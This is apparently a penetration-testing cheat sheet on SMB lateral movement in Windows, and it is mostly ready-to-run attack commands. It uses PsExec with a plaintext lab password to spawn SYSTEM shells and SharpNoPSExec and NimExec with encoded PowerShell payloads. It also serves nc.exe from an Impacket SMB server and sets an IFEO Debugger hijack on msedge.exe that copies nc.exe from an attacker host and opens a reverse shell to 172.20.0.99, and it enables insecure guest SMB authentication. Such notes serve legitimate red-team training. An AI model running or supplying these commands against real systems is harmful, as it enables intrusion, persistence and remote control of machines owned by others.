# 05.08 SMB Lateral Movement Windows Tools

> Move laterally over SMB (445/139) — `PsExec.exe`, `SharpNoPSExec` (service hijack), or `reg.exe` IFEO abuse via the winreg pipe.

## Overview

SMB (TCP 445/139) is the primary Windows lateral-movement protocol requiring local admin rights. PsExec.exe creates an interactive session via ADMIN$ and PSEXESVC. SharpNoPSExec and NimExec avoid new-service creation by hijacking an existing stopped/disabled LocalSystem service, reducing EDR noise. Reg.exe abuses the winreg SMB pipe to remotely modify Image File Execution Options for code execution when a target binary is launched.

## Steps

- Requires local admin on target; domain users with admin rights or RID-500 local admin can use PsExec; non-RID-500 local admins are blocked by UAC remote restrictions.
- PsExec `-i` for interactive shell; add `-s` to run as SYSTEM.
- SharpNoPSExec selects a random stopped/manual/LocalSystem service, swaps binary path, waits 5 s, then restores — delivers reverse shell.
- NimExec uses NTLM over custom RPC packets over svcctl named pipe; accepts `-h <NT hash>` instead of password.
- Reg.exe Image File Execution Options hijack: add `Debugger` value under `msedge.exe` key pointing to SMB-hosted nc.exe payload; fires when any user opens Edge.
- Check `AllowInsecureGuestAuth` registry key if SMB share needs unauthenticated access.
- SMB scan: `nmap 172.20.0.52 -sV -sC -p139,445 -Pn` before attempting execution.

## Commands

### SMB nmap scan

```bash
proxychains4 -q nmap 172.20.0.52 -sV -sC -p139,445 -Pn
```

### PsExec interactive

```powershell
.\PsExec.exe \\SRV02 -i -u <DOMAIN>\helen -p RedRiot88 cmd
```

### PsExec as SYSTEM

```powershell
.\PsExec.exe \\SRV02 -i -s -u <DOMAIN>\helen -p RedRiot88 cmd
```

### SharpNoPSExec

```powershell
.\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e BASE64"
```

### NimExec

```powershell
.\NimExec -u helen -d <DOMAIN>.local -p RedRiot88 -t 172.20.0.52 -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v
```

### Impacket SMB server for nc.exe payload

```bash
sudo python3 smbserver.py share -smb2support /home/plaintext/nc.exe
```

### Reg.exe IFEO hijack

```powershell
reg.exe add "\\srv02.<DOMAIN>.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\172.20.0.99\share\nc.exe && nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"
```

### Query AllowInsecureGuestAuth

```powershell
reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth
```

### Enable AllowInsecureGuestAuth

```powershell
reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
```
